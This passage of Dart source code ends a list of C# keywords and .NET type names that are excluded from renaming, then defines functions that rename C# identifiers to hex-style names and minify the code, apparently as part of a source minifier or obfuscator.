    'double',
    'else',
    'enum',
    'event',
    'explicit',
    'extern',
    'false',
    'finally',
    'fixed',
    'float',
    'for',
    'foreach',
    'goto',
    'if',
    'implicit',
    'in',
    'int',
    'interface',
    'internal',
    'is',
    'lock',
    'long',
    'namespace',
    'new',
    'null',
    'object',
    'operator',
    'out',
    'override',
    'params',
    'private',
    'protected',
    'public',
    'readonly',
    'ref',
    'return',
    'sbyte',
    'sealed',
    'short',
    'sizeof',
    'stackalloc',
    'static',
    'string',
    'struct',
    'switch',
    'this',
    'throw',
    'true',
    'try',
    'typeof',
    'uint',
    'ulong',
    'unchecked',
    'unsafe',
    'ushort',
    'using',
    'var',
    'virtual',
    'void',
    'volatile',
    'while',
    'add',
    'alias',
    'ascending',
    'async',
    'await',
    'by',
    'descending',
    'dynamic',
    'equals',
    'from',
    'get',
    'global',
    'group',
    'into',
    'join',
    'let',
    'nameof',
    'on',
    'orderby',
    'partial',
    'remove',
    'select',
    'set',
    'value',
    'when',
    'where',
    'yield',
    'System',
    'Console',
    'Math',
    'String',
    'Object',
    'Exception',
    'Int32',
    'Int64',
    'Boolean',
    'Byte',
    'Char',
    'Double',
    'Single',
    'Decimal',
    'DateTime',
    'TimeSpan',
    'Guid',
    'Convert',
    'BitConverter',
    'Array',
    'Enum',
    'Type',
    'Activator',
    'Delegate',
    'MulticastDelegate',
    'EventArgs',
    'IDisposable',
    'IEnumerable',
    'IEnumerator',
    'ICollection',
    'IList',
    'IDictionary',
    'List',
    'Dictionary',
    'HashSet',
    'Queue',
    'Stack',
    'Stream',
    'MemoryStream',
    'FileStream',
    'BufferedStream',
    'TextReader',
    'TextWriter',
    'StreamReader',
    'StreamWriter',
    'StringReader',
    'StringWriter',
    'BinaryReader',
    'BinaryWriter',
    'Encoding',
    'UTF8Encoding',
    'ASCIIEncoding',
    'UnicodeEncoding',
    'File',
    'Directory',
    'Path',
    'Environment',
    'Process',
    'ProcessStartInfo',
    'Thread',
    'Task',
    'HttpContext',
    'HttpRequest',
    'HttpResponse',
    'HttpServerUtility',
    'HttpApplication',
    'HttpApplicationState',
    'HttpSessionState',
    'Page',
    'Request',
    'Response',
    'Server',
    'Session',
    'Application',
    'Cache',
    'User',
    'Url',
    'Uri',
    'WebClient',
    'HttpClient',
    'HttpWebRequest',
    'HttpWebResponse',
    'Socket',
    'IPAddress',
    'IPEndPoint',
    'Dns',
    'BitArray',
    'Regex',
    'Match',
    'MatchCollection',
    'Group',
    'Capture',
    'StringBuilder',
    'Stopwatch',
    'Random',
    'GC',
    'Nullable',
    'ValueType',
    'Attribute',
    'Obsolete',
    'Conditional',
    'Debugger',
    'Debug',
    'Trace',
    'StringComparison',
    'CultureInfo',
    'IFormatProvider',
    'Comparer',
    'EqualityComparer',
    'Parallel',
    'Lazy',
    'Tuple',
    'Action',
    'Func',
    'Predicate',
    'Comparison',
    'EventHandler',
  };

  static Map<String, String> _csharpUnionRenameMap(Iterable<String> snippets) {
    final all = <String>{};
    for (final code in snippets) {
      final masked = _maskJavaLikeQuotes(code, <String>[]);
      for (final m in _javaIdentRe.allMatches(masked)) {
        final id = m.group(1)!;
        if (!_csharpBlacklist.contains(id)) all.add(id);
      }
    }
    return _buildHexRenameMap(all);
  }

  static String _csharpLikeApplyMapAndMinify(
    String inner,
    Map<String, String> map,
  ) {
    final store = <String>[];
    final masked = _maskJavaLikeQuotes(inner, store);
    var renamed = _applyHexRenameMap(masked, map);
    for (var i = 0; i < store.length; i++) {
      renamed = renamed.replaceAll('\x01#${i}\x01', store[i]);
    }
    return _javaLikeMinify(renamed);
  }

  static final _rnd = Random.secure();
}
